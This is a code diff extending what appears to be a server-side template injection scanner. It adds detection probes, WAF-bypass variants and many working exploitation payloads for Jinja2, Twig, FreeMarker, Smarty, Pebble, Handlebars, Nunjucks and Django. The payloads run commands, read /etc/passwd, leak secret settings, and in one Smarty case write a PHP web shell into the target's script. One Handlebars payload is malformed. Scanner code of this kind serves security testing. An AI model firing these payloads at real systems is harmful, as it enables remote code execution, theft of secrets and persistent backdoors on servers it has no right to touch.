@@ -24,6 +24,7 @@ _logger = logging.getLogger(__name__)
 # Tier 1: Polyglot probes — trigger math evaluation across multiple engines
 # ---------------------------------------------------------------------------
 _TIER1_PROBES_CORE: List[Tuple[str, str]] = [
+    # Classic math evaluation — broad engine coverage
     ("{{7*7}}", r"49"),
     ("${7*7}", r"49"),
     ("#{7*7}", r"49"),
@@ -32,6 +33,18 @@ _TIER1_PROBES_CORE: List[Tuple[str, str]] = [
     ("{7*7}", r"49"),
     ("{{7*'7'}}", r"7777777|49"),   # Jinja2 vs Twig disambiguation
     ("${{7*7}}", r"49"),
+    # Additional engine probes
+    ("{{{7*7}}}", r"49"),           # Handlebars triple-stash
+    ("{% 7*7 %}", r"49"),          # Django/Twig block-level
+    ("{{= 7*7}}", r"49"),           # eJS-style
+    ("#{ 7 * 7 }", r"49"),          # Ruby/ERB
+    ("@(7*7)", r"49"),              # Razor (C#)
+    ("<#assign x=7*7>${x}", r"49"), # FreeMarker alt
+    # WAF bypass variants (whitespace / encoding tricks)
+    ("{{7 * 7}}", r"49"),
+    ("{{7\t*\t7}}", r"49"),
+    ("{{\t7*7\t}}", r"49"),
+    ("{{7*7 }}", r"49"),
 ]
 
 def _load_ssti_tier1() -> List[Tuple[str, str]]:
@@ -63,30 +76,53 @@ _TIER2_ENGINE_PROBES: Dict[str, List[Tuple[str, str]]] = {
         ("{{config}}", r"<Config|SECRET_KEY|DEBUG"),
         ("{{self.__class__}}", r"TemplateReference"),
         ("{{lipsum}}", r"\w+\s+\w+"),
+        ("{{namespace.__init__.__globals__}}", r"builtins|__doc__"),
     ],
     "Twig": [
-        ("{{_self}}", r"Twig_Template|__TwigTemplate_"),       # Twig 2.x and 3.x
+        ("{{_self}}", r"Twig_Template|__TwigTemplate_"),
         ("{{_self.env}}", r"Twig_Environment|__TwigEnvironment"),
         ("{{dump()}}", r"NULL|bool\(|string\("),
+        ("{{constant('PHP_OS')}}", r"Linux|Windows|Darwin|FreeBSD"),
     ],
     "FreeMarker": [
         ("${.data_model}", r"freemarker|BeansWrapper"),
         ("${.template_name}", r"\.ftl|template"),
+        ("${.version}", r"\d+\.\d+\.\d+"),
     ],
     "Velocity": [
         ("#set($x=7*7)${x}", r"49"),
         ("#foreach($i in [1..3])${i}#end", r"123"),
+        ("#set($str=$x.class.forName('java.lang.String'))${str}", r"java\.lang\.String"),
     ],
     "Smarty": [
         ("{$smarty.version}", r"\d+\.\d+"),
         ("{php}echo 7*7;{/php}", r"49"),
+        ("{math equation='7*7'}", r"49"),
     ],
     "Pebble": [
         ("{{1+1}}", r"2"),
+        ("{{ 'a'.toUpperCase() }}", r"A"),
     ],
     "Mako": [
         ("${7*7}", r"49"),
         ("<% x = 7*7 %>\n${x}", r"49"),
+        ("${self.uri}", r"\.html|\.mako|template"),
+    ],
+    "Handlebars": [
+        ("{{#with 'test'}}{{this}}{{/with}}", r"test"),
+        ("{{lookup . 'constructor'}}", r"function|Function"),
+    ],
+    "Nunjucks": [
+        ("{{range.constructor}}", r"function|Function"),
+        ("{{ 7 * 7 }}", r"49"),
+    ],
+    "Django": [
+        ("{% debug %}", r"settings|DATABASES|SECRET"),
+        ("{{ request.META }}", r"SERVER_NAME|HTTP_HOST"),
+    ],
+    "Razor": [
+        ("@(7*7)", r"49"),
+        ("@DateTime.Now", r"\d{4}[-/]\d{2}[-/]\d{2}"),
     ],
 }
 
@@ -115,14 +151,19 @@ _TIER3_POC: Dict[str, List[str]] = {
         "{{''.__class__.__mro__[1].__subclasses__()}}",
         "{{request.environ}}",
         "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+        "{{namespace.__init__.__globals__['os'].popen('id').read()}}",
     ],
     "Twig": [
         "{{_self.env.getExtension('Twig_Extension_Debug')}}",
         "{{['id']|map('system')|join}}",
+        "{{'/etc/passwd'|file_excerpt(1,30)}}",
+        "{{'id'|shell_exec}}",
     ],
     "FreeMarker": [
         "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
         "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "<#assign classloader=product.class.protectionDomain.classLoader><#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")><#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)><#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")>${dwf.newInstance(ec,null)(\"id\")}",
     ],
     "Mako": [
         "${self.module.cache.util.os.popen('id').read()}",
@@ -134,9 +175,19 @@ _TIER3_POC: Dict[str, List[str]] = {
     "Smarty": [
         "{system('id')}",
         "{php}echo shell_exec('id');{/php}",
+        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']);?>\",self::clearConfig())}",
     ],
     "Pebble": [
         "{% set cmd = 'id' %}{% set bytes = \"\".class.forName('java.lang.Runtime').methods[6].invoke(\"\".class.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')).inputStream.readAllBytes() %}{{ bytes }}",
+    ],
+    "Handlebars": [
+        "{{#with \"s\" as |string|}}{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id').toString()\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
+    ],
+    "Nunjucks": [
+        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+    ],
+    "Django": [
+        "{% load log %}{% get_admin_log 10 as log %}{% for e in log %}{{e.object_repr}}{% endfor %}",
     ],
 }
 
